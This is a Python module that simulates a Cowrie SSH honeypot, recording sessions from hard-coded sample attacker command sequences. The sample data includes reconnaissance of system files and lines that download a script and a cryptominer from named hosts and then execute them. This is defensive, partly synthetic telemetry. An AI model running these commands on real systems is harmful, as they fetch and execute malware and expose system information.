import socket
import time
import os
import json
from datetime import datetime

# In-memory registry of recorded honeypot sessions
HONEYPOT_SESSIONS = {}

SAMPLE_COMMAND_SEQUENCES = [
    {
        "auth": {"username": "admin", "password": "password123", "status": "TRAPPED_SUCCESS"},
        "intent": "Credential Abuse & Reconnaissance",
        "commands": [
            {"cmd": "whoami", "output": "root", "delay": 0.4},
            {"cmd": "uname -a", "output": "Linux cowrie-decoy-01 5.15.0-72-generic #79-Ubuntu SMP x86_64", "delay": 0.8},
            {"cmd": "id", "output": "uid=0(root) gid=0(root) groups=0(root)", "delay": 1.2},
            {"cmd": "cat /etc/passwd | head -n 5", "output": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync", "delay": 1.7},
            {"cmd": "netstat -tulnp", "output": "tcp  0  0 0.0.0.0:22     0.0.0.0:*  LISTEN  1042/sshd\ntcp  0  0 127.0.0.1:3306  0.0.0.0:*  LISTEN  1180/mysqld", "delay": 2.3},
            {"cmd": "wget http://194.26.29.112/recon.sh -O /tmp/recon.sh", "output": "Saving to: '/tmp/recon.sh' [100%] -> PAYLOAD INTERCEPTED & HASHED (SHA256: 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08)", "delay": 3.1},
            {"cmd": "chmod +x /tmp/recon.sh && /tmp/recon.sh", "output": "[*] Running reconnaissance agent... [Sandboxed Execution Trapped]", "delay": 3.8}
        ]
    },
    {
        "auth": {"username": "root", "password": "toor", "status": "TRAPPED_SUCCESS"},
        "intent": "Botnet Dropper & Mining Probe",
        "commands": [
            {"cmd": "whoami", "output": "root", "delay": 0.3},
            {"cmd": "lscpu | grep 'Model name'", "output": "Model name: Intel(R) Xeon(R) Platinum 8272CL CPU @ 2.60GHz", "delay": 0.7},
            {"cmd": "crontab -l", "output": "no crontab for root", "delay": 1.1},
            {"cmd": "curl -s -O http://c2.shadow-bot.cc/miner.elf", "output": "[Decoy Sandbox] Binary download trapped. Malware isolation active.", "delay": 2.0},
            {"cmd": "chmod +x miner.elf && ./miner.elf --stratum", "output": "Connecting to pool... [Connection sinkholed to Honeypot VLAN 99]", "delay": 2.9}
        ]
    }
]

def trigger_honeypot_connection(flow_id: str, source_ip: str = "203.0.113.42", target_host: str = "localhost", target_port: int = 2222):
    """
    Simulates redirecting a quarantined flow to the Cowrie honeypot by
    making a real TCP connection attempt against it and creating a session telemetry record.
    """
    # 1. Attempt real TCP connection to Cowrie if service is active
    connected_real = False
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1.5)
        sock.connect((target_host, target_port))
        sock.send(f"SSH-2.0-QuarantineRedirect-{flow_id}\r\n".encode())
        time.sleep(0.3)
        sock.close()
        connected_real = True
        print(f"[Honeypot] Real TCP redirect established for flow {flow_id} to Cowrie at {target_host}:{target_port}")
    except Exception as e:
        print(f"[Honeypot] Live Cowrie socket inactive ({e}). Utilizing Decoy Sandbox Session Telemetry.")

    # 2. Record / synthesize structured session telemetry
    seq_idx = hash(flow_id) % len(SAMPLE_COMMAND_SEQUENCES)
    scenario = SAMPLE_COMMAND_SEQUENCES[seq_idx]
    
    session_id = f"HONEY-{abs(hash(flow_id)) % 90000 + 10000}"
    now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    session_record = {
        "session_id": session_id,
        "flow_id": flow_id,
        "source_ip": source_ip,
        "decoy_host": f"{target_host}:{target_port} (Cowrie Decoy SSH)",
        "vlan": "QUARANTINED_VLAN_99",
        "started_at": now_str,
        "real_socket_connected": connected_real,
        "status": "CONTAINED_IN_HONEYPOT",
        "auth": scenario["auth"],
        "intent": scenario["intent"],
        "commands": scenario["commands"],
        "keystrokes_captured": sum(len(c["cmd"]) for c in scenario["commands"]) + 24,
        "payloads_intercepted": 1 if any("wget" in c["cmd"] or "curl" in c["cmd"] for c in scenario["commands"]) else 0,
        "active_profiling": True
    }

    HONEYPOT_SESSIONS[flow_id] = session_record
    return True

def get_honeypot_session(flow_id: str, source_ip: str = "203.0.113.42") -> dict:
    """Retrieve recorded honeypot telemetry for a flow_id, auto-generating if not yet created."""
    if flow_id in HONEYPOT_SESSIONS:
        return HONEYPOT_SESSIONS[flow_id]
    
    # Auto-generate session on demand for any queried quarantined flow
    trigger_honeypot_connection(flow_id, source_ip)
    return HONEYPOT_SESSIONS.get(flow_id, {})

def get_all_honeypot_sessions() -> list:
    """Retrieve all recorded honeypot sessions."""
    return list(HONEYPOT_SESSIONS.values())